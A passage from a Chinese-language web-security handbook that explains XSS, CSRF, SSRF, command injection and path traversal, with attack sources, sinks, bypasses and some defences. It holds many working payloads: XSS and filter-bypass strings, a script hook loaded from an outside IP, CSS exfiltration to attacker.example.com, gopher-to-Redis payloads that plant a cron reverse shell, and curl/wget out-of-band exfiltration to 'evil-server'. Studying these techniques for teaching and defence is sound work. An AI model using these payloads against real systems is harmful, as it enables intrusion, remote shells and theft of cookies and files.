-   For FireFox \<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; url=data:text/html;base64, PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=\"\>

-   \<link rel=\"import\" /\>

-   \<meta http-equiv=\"refresh\" content=\"0; [url=http://\....\"](http://./) /\>

-   ##### 仅限制script-src时：

> **--** \<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"\>\</ object\>

### 4.2.5  XSS数据源

#### URL

-   location

-   location.href

-   location.pathname

-   location.search

-   location.hash

-   document.URL

-   document.documentURI

-   document.baseURI

#### Navigation

-   window.name

-   document.referrer

#### Communication

-   Ajax

-   Fetch

-   WebSocket

-   PostMessage

#### Storage

-   Cookie

-   LocalStorage

-   SessionStorage

### 4.2.6  Sink

#### 执行JavaScript

-   eval(payload)

-   setTimeout(payload, 100)

-   setInterval(payload, 100)

-   Function(payload)()

-   \<script\>payload\</script\>

-   \<img src=x onerror=payload\>

#### 加载URL

-   location=javascript:alert(/xss/)

-   location.href=javascript:alert(/xss/)

-   location.assign(javascript:alert(/xss/))

-   location.replace(javascript:alert(/xss/))

#### 执行HTML

-   xx.innerHTML=payload

-   xx.outerHTML=payload

-   document.write(payload)

-   document.writeln(payload)

### 4.2.7  XSS保护

#### HTML过滤

> 使用一些白名单或者黑名单来过滤用户输入的 HTML，以实现过滤的效果。例如 DOMPurify 等工具都是用该方式实现了 XSS 的保护。

#### X-Frame

X-Frame-Options响应头有三个可选的值：

- ##### DENY

  - 页面不能被嵌入到任何 iframe 或 frame 中

-   ##### SAMEORIGIN

    -   页面只能被本站页面嵌入到 iframe 或者 frame 中

-   ##### ALLOW-FROM

    -   页面允许 frame 或 frame 加载

#### XSS保护头

> 基于 Webkit 内核的浏览器 (比如 Chrome) 在特定版本范围内有一个名为 XSS auditor 的防护机制，如果浏览器检测到了含有恶意代码的输入被呈现在 HTML 文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来。
>
> 而浏览器是否要拦截这段恶意代码取决于浏览器的 XSS 防护设置。
>
> 要设置浏览器的防护机制，则可使用 X-XSS-Protection 字段该字段有三个可选的值

-   0 : 表示关闭浏览器的 XSS 防护机制

-   1 : 删除检测到的恶意代码，如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为

> X-XSS-Protection 配置为 1，这是浏览器的默认设置

-   1; mode=block : 如果检测到恶意代码，在不渲染恶意代码

> FireFox 没有相关的保护机制，如果需要保护，可使用 NoScript 等相关插件。

### 4.2.8  WAF Bypass

-   利用 \<\> 标记

-   ##### 利用 html 属性

    -   href

    -   lowsrc

    -   bgsound

    -   background

    -   value

    -   action

    -   dynsrc

-   ##### 关键字

    -   利用回车拆分

    -   ##### 字符串拼接

        -   window\[\"al\" + \"ert\"\]

-   ##### 利用编码绕过

    -   base64

    -   jsfuck

    -   String.fromCharCode

    -   HTML

    -   URL

    - ##### hex
    
      - window\[\"\\x61\\x6c\\x65\\x72\\x74\"\]
    
    - unicode
    
    - ##### utf7
    
      - +ADw-script+AD4-alert(\'XSS\')+ADsAPA-/script+AD4-
    
    - utf16

-   大小写混淆

-   对标签属性值转码

-   产生事件

-   css 跨站解析

-   ##### 长度限制 bypass

    -   eval(name)

    -   eval(hash)

    -   import

    -   \$.getScript

    -   \$.get

-   **.**

    -   使用 。绕过 IP/域名

    -   document\[\'cookie\'\] 绕过属性取值

-   过滤引号用 '' ' '' 绕过

### 4.2.9  技巧

#### httponly

-   在 cookie 为 httponly 的情况下，可以通过 xss 直接在源站完成操作，不直接获取 cookie。

-   在有登录操作的情况下，部分站点直接发送登录请求可能会带有 cookie

-   部分特定版本的浏览器可能会在 httponly 支持/处理上存在问题

-   低版本浏览器支持 TRACE / TRACK，可获取敏感的 header 字段

-   phpinfo 等页面可能会回显信息，这些信息中包含 http 头

-   通过 xss 劫持页面钓鱼

-   通过 xss 伪造 oauth 等授权请求，远程登录

#### CSS注入基本介绍

> CSS 注入最早开始于利用 CSS 中的 expression() url() regex() 等函数或特性来引入外部的恶意代码，但是随着浏览器的发展，这种方式被逐渐禁用，与此同时，出现了一些新的攻击方式。

#### CSS selectors

> ```html
> <style>
> #form2 input[value^='a'] { background-image: url(http://localhost/log.php/a); }
> #form2 input[value^='b'] { background-image: url(http://localhost/log.php/b); }
> #form2 input[value^='c'] { background-image: url(http://localhost/log.php/c); }
> [...]
> </style>
> <form action="http://example.com" id="form2">
> <input type="text" id="secret" name="secret" value="abc">
> </form>
> ```
>
> 上图是利用 CSS selectors 完成攻击的一个示例

#### Abusing Unicode Range

> 当可以插入 CSS 的时候，可以使用 font-face 配合 unicode-range 获取目标网页对应字符集。PoC 如下
>
> ```html
> <style>
> @font-face{
> font-family:poc;
> src: url(http://attacker.example.com/?A); /* fetched */
> unicode-range:U+0041;
> }
> @font-face{
> font-family:poc;
> src: url(http://attacker.example.com/?B); /* fetched too */
> unicode-range:U+0042;
> }
> @font-face{
> font-family:poc;
> src: url(http://attacker.example.com/?C); /* not fetched */
> unicode-range:U+0043;
> }
> #sensitive-information{
> font-family:poc;
> }
> </style>
> <p id="sensitive-information">AB</p>
> ```
>
> 

> 当字符较多时，则可以结合 ::first-line 等 CSS 属性缩小范围，以获取更精确的内容

#### Bypass Via Script Gadgets

##### 简介

> 一些网站会使用白名单或者一些基于 DOM 的防御方式，对这些方式，有一种被称为 Code Reuse 的攻击方式可以绕过。该方式和二进制攻防中的 Gadget 相似，使用目标中的合法代码来达到绕过防御措施的目的。在论文 Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets 中有该方法的具体描述。
>
> portswigger 的 一 篇 博 文 也 表 达 了 类 似 的 想 法 https://portswigger.net/blog/ abusing-javascript-frameworks-to-bypass-xss-mitigations。
>
> 下面有一个简单的例子，这个例子使用了 DOMPurify 来加固，但是因为引入了 jquery.mobile.js 导致可以被攻击。
>
> ```php
> // index.php
> <?php
> $msg = $_GET['message'];
> $msg = str_replace("\n", "", $msg);
> $msg = base64_encode($msg);
> ?>
> ```
>
> ```html
> <!DOCTYPE html>
> <html lang="en">
> <head>
> <meta charset="UTF-8">
> <title>Preview</title>
> <script type="text/javascript" src="purify.js"></script>
> <script type="text/javascript" src="jquery.js"></script>
> <script type="text/javascript" src="jquery.mobile.js"></script>
> </head>
> <body>
> <script type="text/javascript">
> var d= atob('<?php echo $msg; ?>');
> var cleanvar = DOMPurify.sanitize(d);
> document.write(cleanvar);
> </script>
> </body>
> </html>
> ```
>
> ```php
> // payload
> <div data-role=popup id='-->
> &lt;script&gt;alert(1)&lt;/script&gt;'>
> </div>
> ```

#### RPO(Relative Path Overwrite)

> RPO(Relative Path Overwrite) 攻击又称为相对路径覆盖攻击，依赖于浏览器和网络服务器的反应，利用服务器的 Web 缓存技术和配置差异。

### 4.2.10  Payload

#### 常用

-   \<script\>alert(/xss/)\</script\>

-   \<svg onload=alert(document.domain)\>

-   \<img src=document.domain onerror=alert(document.domain)\>

-   \<M onmouseover=alert(document.domain)\>M

-   \<marquee onscroll=alert(document.domain)\>

-   \<a href=javascript:alert(document.domain)\>M\</a\>

-   \<body onload=alert(document.domain)\>

-   \<details open ontoggle=alert(document.domain)\>

-   \<embed src=javascript:alert(document.domain)\>

#### 大小写绕过

-   \<script\>alert(1)\</script\>

-   \<sCrIpT\>alert(1)\</sCrIpT\>

-   \<ScRiPt\>alert(1)\</ScRiPt\>

-   \<sCrIpT\>alert(1)\</ScRiPt\>

-   \<ScRiPt\>alert(1)\</sCrIpT\>

-   \<img src=1 onerror=alert(1)\>

-   \<iMg src=1 oNeRrOr=alert(1)\>

-   \<ImG src=1 OnErRoR=alert(1)\>

-   \<img src=1 onerror=\"alert(&quot;M&quot;)\"\>

-   \<marquee onscroll=alert(1)\>

-   \<mArQuEe OnScRoLl=alert(1)\>

-   \<MaRqUeE oNsCrOlL=alert(1)\>

#### 各种alert

-   \<script\>alert(1)\</script\>

-   \<script\>confirm(1)\</script\>

-   \<script\>prompt(1)\</script\>

-   \<script\>alert(\'1\')\</script\>

-   \<script\>alert(\"1\")\</script\>

-   \<script\>alert\`1\`\</script\>

-   \<script\>(alert)(1)\</script\>

-   \<script\>a=alert,a(1)\</script\>

-   \<script\>\[1\].find(alert)\</script\>

-   \<script\>top\[\"al\"+\"ert\"\](1)\</script\>

-   \<script\>top\[\"a\"+\"l\"+\"e\"+\"r\"+\"t\"\](1)\</script\>

-   \<script\>top\[/al/.source+/ert/.source\](1)\</script\>

-   \<script\>top\[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source\](1)\</script\>

#### 伪协议

-   \<a href=javascript:/0/,alert(%22M%22)\>M\</a\>

-   \<a href=javascript:/00/,alert(%22M%22)\>M\</a\>

-   \<a href=javascript:/000/,alert(%22M%22)\>M\</a\>

-   \<a href=javascript:/M/,alert(%22M%22)\>M\</a\>

#### Chrome XSS auditor bypass

-   ?param=https://&param=@z.exeye.io/import%20rel=import%3E

-   \<base href=javascript:/M/\>\<a href=,alert(1)\>M\</a\>

-   \<base href=javascript:/M/\>\<iframe src=,alert(1)\>\</iframe\>

#### 长度限制

```js
<script>s+="l"</script>
\...
<script>eval(s)</script>
```

#### jquery sourceMappingURL

```js
</textarea>
<script>
	var a=1//@ sourceMapping
	URL=//xss.site
</script>
```

#### 图片名

```html
"><img src=x onerror=alert(document.cookie)>.gif
```

#### 过期的payload

-   src=javascript:alert 基本不可以用

-   css expression 特性只在旧版本 ie 可用

#### css

```html
<div style="background-image:url(javascript:alert(/xss/))">
<style>@import'http://ha.ckers.org/xss.css';</style>
```

#### markdown

```markdown
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&
,→#x27&#x58&#x53&#x53&#x27&#x29>
![a'"`onerror=prompt(document.cookie)](x)
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
```

#### iframe

```html
<iframe onload='
var sc = document.createElement("scr" + "ipt");
sc.type = "text/javascr" + "ipt";
sc.src = "http://1.2.3.4/js/hook.js";
document.body.appendChild(sc);
'
/>
```

```html
-   <iframe src=javascript:alert(1)></iframe>

-   <iframe src="data:text/html,<iframe src=javascript:alert('M')></iframe>"></iframe>

-   <iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+></iframe>

-   <iframe srcdoc=<svg/o&#x6E;load&equals;alert&lpar;1)&gt;></iframe>

-   <iframe src=https://baidu.com width=1366 height=768></iframe>

-   <iframe src=javascript:alert(1) width=1366 height=768></iframe>
```

#### form

```html
-   <form action=javascript:alert(1)><input type=submit>

-   <form><button formaction=javascript:alert(1)>M

-   <form><input formaction=javascript:alert(1) type=submit value=M>

-   <form><input formaction=javascript:alert(1) type=image value=M>

-   <form><input formaction=javascript:alert(1) type=image src=1>
```

#### meta

```html
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>;REL=stylesheet">
```

### 4.2.11  持久化

#### 基于存储

> 有时候网站会将信息存储在 Cookie 或 localStorage，而因为这些数据一般是网站主动存储的，很多时候没有对 Cookie 或 localStorage 中取出的数据做过滤，会直接将其取出并展示在页面中，甚至存了 JSON 格式的数据时，部分站点存在 eval(data) 之类的调用。因此当有一个 XSS 时，可以把 payload 写入其中，在对应条件下触发。
>
> 在一些条件下，这种利用方式可能因为一些特殊字符造成问题，可以使用 String.fromCharCode 来绕过。

#### Service Worker

> Service Worker 可以拦截 http 请求，起到类似本地代理的作用，故可以使用 Service Worker Hook 一些请求，在请求中返回攻击代码，以实现持久化攻击的目的。
>
> 在 Chrome 中，可通过 chrome://inspect/#service-workers 来查看 Service Worker 的状态，并进行停止。

#### AppCache

> 在可控的网络环境下（公共 wifi），可以使用 AppCache 机制，来强制存储一些 Payload，未清除的情况下，用户访问站点时对应的 payload 会一直存在。

### 4.2.12  参考链接

#### wiki

-   [AwesomeXSS](https://github.com/UltimateHackers/AwesomeXSS)

-   [w3c](https://w3c.github.io/webappsec-csp/)

-   [dom xss wiki](https://github.com/wisec/domxsswiki/wiki)

-   [content-security-policy.com](https://content-security-policy.com/)

-   [markdwon xss](https://shubs.io/exploiting-markdown-syntax-and-telescope-persistent-xss-through-markdown-cve-2014-5144/)

-   [xss cheat sheet](https://brutelogic.com.br/blog/cheat-sheet/)

-   [html5 security cheatsheet](https://html5sec.org/)

-   [http security headers](https://www.netsparker.com/whitepaper-http-security-headers/)

-   [XSSChallengeWiki](https://github.com/cure53/XSSChallengeWiki/wiki)

#### Challenges

-   [XSS Challenge By Google](https://xss-game.appspot.com/)

-   [prompt to win](http://prompt.ml/0)

#### CSS

-   [rpo](http://www.thespanner.co.uk/2014/03/21/rpo/)

-   [rpo 攻击初探](http://www.zjicmisa.org/index.php/archives/127/)

-   [Reading Data via CSS](https://curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html)

-   [css based attack abusing unicode range](http://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html)

-   [css injection](https://speakerdeck.com/lmt_swallow/css-injection-plus-plus-ji-cun-shou-fa-falsegai-guan-todui-ce)

-   [css timing attack](https://blog.sheddow.xyz/css-timing-attack/)

#### 同源策略

-   [Same origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)

-   [cors security guide](https://www.bedefended.com/papers/cors-security-guide)

-   [logically bypassing browser security boundaries](https://speakerdeck.com/shhnjk/logically-bypassing-browser-security-boundaries)

#### bypass

-   [666 lines of xss payload](https://gist.github.com/JohannesHoppe/5612274)

-   [xss auditor bypass](https://github.com/masatokinugawa/filterbypass)

-   [xss auditor bypass writeup](https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html)

-   [bypassing csp using polyglot jpegs](https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs)

-   [bypass xss filters using javascript global variables](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)

#### 持久化

-   [变种 XSS 持久控制 by tig3r](http://drops.wooyun.org/web/10798)

-   [Using Appcache and ServiceWorker for Evil](https://sakurity.com/blog/2015/08/13/middlekit.html)

#### Tricks

-   [Service Worker 安全探索](https://github.com/etherdream/sw-sec)

-   [前端黑魔法](https://github.com/EtherDream/web-frontend-magic)



## 4.3  CSRF

### 4.3.1  简介

> 跨站请求伪造 (Cross-Site Request Forgery, CSRF)，也被称为 One Click Attack 或者 Session Riding ，通常缩写为 CSRF，是一种对网站的恶意利用。尽管听起来像 XSS，但它与 XSS 非常不同，XSS 利用站点内的信任用户，而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。

### 4.3.2  分类

#### 资源包含

> 资源包含是在大多数介绍 CSRF 概念的演示或基础课程中可能看到的类型。这种类型归结为控制 HTML 标签（例如 \<image\>、\<audio\>、\<video\>、\<object\>、\<script\> 等）所包含的资源的攻击者。如果攻击者能够影响 URL 被加载的话，包含远程资源的任何标签都可以完成攻击。
>
> 由于缺少对 Cookie 的源点检查，如上所述，此攻击不需要 XSS，可以由任何攻击者控制的站点或站点本身执行。此类型仅限于 GET 请求，因为这些是浏览器对资源 URL 唯一的请求类型。这种类型的主要限制是它需要错误地使用安全的 HTTP 请求方式。

#### 基于表单

> 通常在正确使用安全的请求方式时看到。攻击者创建一个想要受害者提交的表单; 其包含一个 JavaScript 片段，强制受害者的浏览器提交。
>
> 该表单可以完全由隐藏的元素组成，以致受害者很难发现它。
>
> 如果处理 cookies 不当，攻击者可以在任何站点上发动攻击，只要受害者使用有效的 cookie 登录，攻击就会成功。如果请求是有目的性的，成功的攻击将使受害者回到他们平时正常的页面。该方法对于攻击者可以将受害者指向特定页面的网络钓鱼攻击特别有效。

#### XMLHttpRequest

> XMLHttpRequest 可能是最少看到的方式，由于许多现代 Web 应用程序依赖 XHR，许多应用花费大量的时间来构建和实现这一特定的对策。
>
> 基于 XHR 的 CSRF 通常由于 SOP 而以 XSS 有效载荷的形式出现。没有跨域资源共享策略 (Cross-Origin Resource Sharing, CORS)，XHR 仅限于攻击者托管自己的有效载荷的原始请求。
>
> 这种类型的 CSRF 的攻击有效载荷基本上是一个标准的 XHR，攻击者已经找到了一些注入受害者浏览器 DOM 的方式。

### 4.3.3  防御

-   通过 CSRF-token 或者验证码来检测用户提交

-   验证 Referer/Content-Type

-   对于用户修改删除等操作最好都使用 POST 操作

-   避免全站通用的 Cookie，严格设置 Cookie 的域

### 4.3.4  参考链接

-   [demo](https://www.github.com/jrozner/csrf-demo)

-   [Wiping Out CSRF](https://medium.com/%40jrozner/wiping-out-csrf-ded97ae7e83f)

-   [Neat tricks to bypass CSRF protection](https://www.slideshare.net/0ang3el/neat-tricks-to-bypass-csrfprotection)

&nbsp;

## 4.4  SSRF

### 4.4.1  简介

> 服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF 攻击通常针对外部网络无法直接访问的内部系统。

#### 漏洞危害

> SSRF 可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用 File 协议读取本地文件。
>
> 内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在 SSRF 时，通常会造成较大的危害。

### 4.4.2  利用方式

> SSRF 利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。
>
> 以 curl 为例, 可以使用 dict 协议操作 Redis、file 协议读文件、gopher 协议反弹 Shell 等功能，常见的 Payload
>
> 如下：
>
> ```shell
> curl -vvv 'dict://127.0.0.1:6379/info'
> curl -vvv 'file:///etc/passwd'
> # 注意: 链接使用单引号，避免$变量问题
> curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d
> %0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/
> 6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d
> %0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d
> %0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit
> %0d%0a'
> ```

### 4.4.3  相关危险函数

> SSRF 涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以 PHP 为例，涉及到的函数有
>
> file_get_contents() / fsockopen() / curl_exec() 等。

### 4.4.4  过滤绕过

#### 更改IP地址写法

一些开发者会通过对传过来的 URL 参数进行正则匹配的方式来过滤掉内网 IP，如采用如下正则表达式：

-   ^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$ 
-    ^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$ 
-   ^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$

对于这种过滤我们采用改编 IP 的写法的方式进行绕过，例如 192.168.0.1 这个 IP 地址可以被改写成：

-   8 进制格式：0300.0250.0.1

-   16 进制格式：0xC0.0xA8.0.1

-   10 进制整数格式：3232235521

-   16 进制整数格式：0xC0A80001

-   合并后两位：1.1.278 / 1.1.755

-   合并后三位：1.278 / 1.755 / 3.14159267

另外 IP 中的每一位，各个进制可以混用。

访问改写后的 IP 地址时，Apache 会报 400 Bad Request，但 Nginx、MySQL 等其他服务仍能正常工作。另外，0.0.0.0 这个 IP 可以直接访问到本地，也通常被正则过滤遗漏。

#### 使用解析到内网的域名

> 如果服务端没有先解析 IP 再过滤内网地址，我们就可以使用 localhost 等解析到内网的域名。
>
> 另外 xip.io 提供了一个方便的服务，这个网站的子域名会解析到对应的 IP，例如 192.168.0.1.xip.io，解析到 192.168.0.1。

#### 利用解析URL所出现的问题

> 在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。
>
> 比如 <http://www.baidu.com@192.168.0.1/> 当后端程序通过不正确的正则表达式（比如将 http 之后到 com为止的字符内容，也就是 [www.baidu.com](http://www.baidu.com/)，认为是访问请求的 host 地址时）对上述 URL 的内容进行解析的时候，很有可能会认为访问 URL 的 host 为 [www.baidu.com](http://www.baidu.com/)，而实际上这个 URL 所请求的内容都是 192.168.0.1 上的内容。

#### 利用跳转

> 如果后端服务器在接收到参数后，正确的解析了 URL 的 host，并 进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。
>
> 可以使用如 [http://httpbin.org/redirect-to?url=http://192.168.0.1](http://httpbin.org/redirect-to?url=http%3A//192.168.0.1) 等服务跳转，但是由于 URL 中包含了
>
> 192.168.0.1 这种内网 IP 地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。
>
> 常用的跳转有 302 跳转和 307 跳转，区别在于 307 跳转会转发 POST 请求中的数据等，但是 302 跳转不会。

#### 通过各种非HTTP协议

> 如果服务器端程序对访问 URL 所采用的协议进行验证的话，可以通过非 HTTP 协议来进行利用。
>
> 比如通过 gopher，可以在一个 url 参数中构造 POST 或者 GET 请求，从而达到攻击内网应用的目的。例如可以使用 gopher 协议对与内网的 Redis 服务进行攻击，可以使用如下的 URL：
>
> ```shell
> gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i>&/dev/tcp/172.19.23.228/23330>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
> ```

> 除了 gopher 协议，File 协议也是 SSRF 中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似 file:///path/to/file 这种格式来访问计算机本地文件。使用 file 协议可以避免服务端程序对于所访问的 IP 进行的过滤。例如我们可以通过 file:///d:/1.txt 来访问 D 盘中 1.txt 的内容。

#### DNS Rebinding

> 一个常用的防护思路是：对于用户请求的 URL 参数，首先服务器端会对其进行 DNS 解析，然后对于 DNS
>
> 服务器返回的 IP 地址进行判断，如果在黑名单中，就禁止该次请求。
>
> 但是在整个过程中，第一次去请求 DNS 服务进行域名解析到第二次服务端去请求 URL 之间存在一个时间差，利用这个时间差，可以进行 DNS 重绑定攻击。
>
> 要完成 DNS 重绑定攻击，我们需要一个域名，并 将这个域名的解析指定到我们自己的 DNS Server，在我们的可控的 DNS Server 上编写解析服务，设置 TTL 时间为 0。这样就可以进行攻击了，完整的攻击流程为：

-   服务器端获得 URL 参数，进行第一次 DNS 解析，获得了一个非内网的 IP

-   对于获得的 IP 进行判断，发现为非黑名单 IP，则通过验证

-   服务器端对于 URL 进行访问，由于 DNS 服务器设置的 TTL 为 0，所以再次进行 DNS 解析，这一次DNS 服务器返回的是内网地址。

-   由于已经绕过验证，所以服务器端返回访问内网资源的结果。

#### 利用IPv6

> 有些服务没有考虑 IPv6 的情况，但是内网又支持 IPv6，则可以使用 IPv6 的本地 IP 如 \[::\] 0000::1 或
>
> IPv6 的内网域名来绕过过滤。

#### 利用IDN

> 一些网络访问工具如 Curl 等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。
>
> 在这些字符中，部分字符会在访问时做一个等价转换，例如 . 和 example.com 等同。利用这种方式，可以用 等字符绕过内网限制。

### 4.4.5  可能的利用点

#### 内网服务

-   Apache Hadoop 远程命令执行

-   axis2-admin 部署 Server 命令执行

-   Confluence SSRF

-   counchdb WEB API 远程命令执行

-   dict

-   docker API 远程命令执行

-   Elasticsearch 引擎 Groovy 脚本命令执行

-   ftp / ftps（FTP 爆破）

-   glassfish 任意文件读取和 war 文件部署间接命令执行

-   gopher

-   HFS 远程命令执行

-   http、https

-   imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）

-   Java 调试接口命令执行

-   JBOSS 远程 Invoker war 命令执行

-   Jenkins Scripts 接口命令执行

-   ldap

-   mongodb

-   php_fpm/fastcgi 命令执行

-   rtsp - smb/smbs（连接 SMB）

-   sftp

-   ShellShock 命令执行

-   Struts2 命令执行

-   telnet

-   tftp（UDP 协议扩展）

-   tomcat 命令执行

-   WebDav PUT 上传任意文件

-   WebSphere Admin 可部署 war 间接命令执行

-   zentoPMS 远程命令执行

#### Redis利用

-   写 ssh 公钥

-   写 crontab

-   写 WebShell

-   Windows 写启动项

-   主从复制加载.so 文件

-   主从复制写无损文件

#### 云主机

> 在 AWS、Google 等云环境下，通过访问云环境的元数据 API 或管理 API，在部分情况下可以实现敏感信息等效果。

### 4.4.6  防御方式

-   过滤返回的信息

-   统一错误信息

-   限制请求的端口

-   禁止不常用的协议

-   对 DNS Rebinding，考虑使用 DNS 缓存或者 Host 白名单

### 4.4.7  参考链接

-   [SSRF 漏洞分析与利用](http://www.91ri.org/17111.html)

-   [A New Era Of SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

-   [php ssrf technique](https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51)

-   [谈一谈如何在 Python 开发中拒绝 SSRF 漏洞](https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html)

-   [SSRF Tips](http://blog.safebuff.com/2016/07/03/SSRF-Tips/)

-   [SSRF in PHP](https://joychou.org/web/phpssrf.html)

&nbsp;

## 4.5  命令注入

### 4.5.1  简介

> 命令注入通常因为指 Web 应用在服务器上拼接系统命令而造成的漏洞。
>
> 该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些 Web 管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如 ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。

### 4.5.2  常见危险函数

#### PHP

-   system

-   exec

-   passthru

-   shell_exec

-   popen

-   proc_open

#### Python

-   system

-   popen

-   subprocess.call

-   spawn

#### Java

-   java.lang.Runtime.getRuntime().exec(command)

### 4.5.3  常见注入方式

-   分号分割

-   \|\| && & 分割

-   \| 管道符

-   \\r\\n %d0%a0 换行

-   反引号解析

-   \$() 替换

### 4.5.4  无回显技巧

-   bash反弹shell

-   DNS带外数据

-   ##### http带外

    -   curl [http://evil-server/\$(whoami)](http://evil-server/%24(whoami))

    -   wget [http://evil-server/\$(whoami)](http://evil-server/%24(whoami))

-   无带外时利用sleep或其他逻辑构造布尔条件

### 4.5.5  常见绕过方式

#### 空格绕过

-   \< 符号 cat\<123

-   \\t / %09

-   \${IFS} 其中 {} 用来截断，比如 cat\$IFS2 会被认为 IFS2 是变量名。另外，在后面加个 \$ 可以起到截断的作用，一般用 \$9，因为 \$9 是当前系统 shell 进程的第九个参数的持有者，它始终为空字符串

#### 黑名单绕过

-   a=l;b=s;\$a\$b

-   base64 echo \"bHM=\" \| base64 -d

-   /?in/?s =\> /bin/ls

-   连接符 cat /etc/pass\'w\'d

-   未定义的初始化变量 cat\$x /etc/passwd

#### 长度限制绕过

```powershell
>wget\
>foo.\
>com
ls -t>a
sh a
```

> 上面的方法为通过命令行重定向写入命令，接着通过 ls 按时间排序把命令写入文件，最后执行直接在 Linux
>
> 终端下执行的话, 创建文件需要在重定向符号之前添加命令这里可以使用一些诸如 w,\[之类的短命令，(使用
>
> ls /usr/bin/? 查看) 如果不添加命令，需要 Ctrl+D 才能结束，这样就等于标准输入流的重定向而在 php 中,使用 shell_exec 等执行系统命令的函数的时候, 是不存在标准输入流的，所以可以直接创建文件。

### 4.5.6  常用符号

#### 命令分隔符

-   %0a / %0d / \\n / \\r

-   ;

-   & / &&

#### 通配符

-   \* 0 到无穷个任意字符

-   ? 一个任意字符

-   \[ \] 一个在括号内的字符，e.g. \[abcd\]

-   \[ - \] 在编码顺序内的所有字符

-   [ ^ \] 一个不在括号内的字符

### 4.5.7  防御

-   不使用时禁用相应函数

-   尽量不要执行外部的应用程序或命令

-   做输入的格式检查

- ##### 转义命令中的所有 shell 元字符

  - shell元字符包括#&;`,|*?~<>^()[]{}$\



## 4.6  目录穿越

### 4.6.1  简介

> 目录穿越（也被称为目录遍历/directory traversal/path traversal）是通过使用 ../ 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。

### 4.6.2  攻击载荷

#### URL参数

-   ../

-   ..\\

-   ..;/

#### Nginx Off by Slash

-   https://vuln.site.com/files../

#### UNC Bypass

-   \\\\localhost\\c\$\\windows\\win.ini

### 4.6.3  过滤绕过

- ##### 单次替换

  - #### ...//

-   URL 编码

- ##### 16 位 Unicode 编码

  - \u002e

- ##### 超长 UTF-8 编码

  - \%e0%40%ae

### 4.6.4  防御

